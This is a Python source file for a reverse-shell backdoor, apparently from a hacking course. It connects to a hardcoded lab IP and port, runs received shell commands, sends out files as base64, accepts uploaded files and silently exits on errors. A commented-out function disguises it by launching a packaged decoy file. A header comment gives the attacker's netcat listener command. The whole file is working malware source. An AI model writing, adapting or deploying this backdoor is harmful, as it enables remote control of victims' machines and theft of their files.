#!/usr/bin/env python

# Use this to open socket and listen on attacking machine for connection from target:
# nc -vv -l -p (port number) or use listener.py

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    
    def __init__(self, ip, port):       
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Arg1 = Target IP (Attacking machine)
        # Arg2 = Listening port on target IP
        # The connect method takes a tuple
        self.connection.connect((ip, port))        

    def reliable_send(self, data):
        # Converts data into json object
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                # Unwrapping the json object to original data
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory_to(self, path):

        # This function is needed to manually change the working directory as
        # subprocess.check_output() does not actually change the directory

        os.chdir(path)
        return ("[+] Changing working directory to : " + path)
              
    def read_file(self, file_path):
        # rb = read files as binary
        with open(file_path, "rb") as file:
            # Returning with base64 encoding, 
            # which converts unknown characters to known characters
            #  that json and python can parse
            return base64.b64encode(file.read())

    def write_file(self, file_path, content):
        with open(file_path, "wb") as file:
            # Unwrapping base64 encoding and writting to file
            file.write(base64.b64decode(content))
            return ("[+] Upload successful!")

    def run(self):
        while True:
            # 1024 is the buffer size for received data
            command = self.reliable_receive()
            
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                
                # Change working directory
                elif command[0] == "cd" and (len(command) > 1):
                    command_result = self.change_working_directory_to(command[1])
                
                # Download file
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                    
                # Upload file
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                    
                # Execute command
                else:
                    # This line still works because this calls the method 
                    # that implements the subprocess.check_output function, which can take
                    # a string or a list of strings as arguments.    
                    command_result = self.execute_system_command(command)
            
            except Exception:
                command_result = "[-] Error"
            
            self.reliable_send(command_result)

def front_file():
    # Extracts the default location of file packaged by pyinstaller + file name
    file_name = sys._MEIPASS + "\image.py"
    # Popen so that current execution is not paused
    subprocess.Popen(file_name, shell=True)

#front_file()

try:      
    my_backdoor = Backdoor("192.168.56.101", 5555)
    my_backdoor.run()
except Exception:
    sys.exit()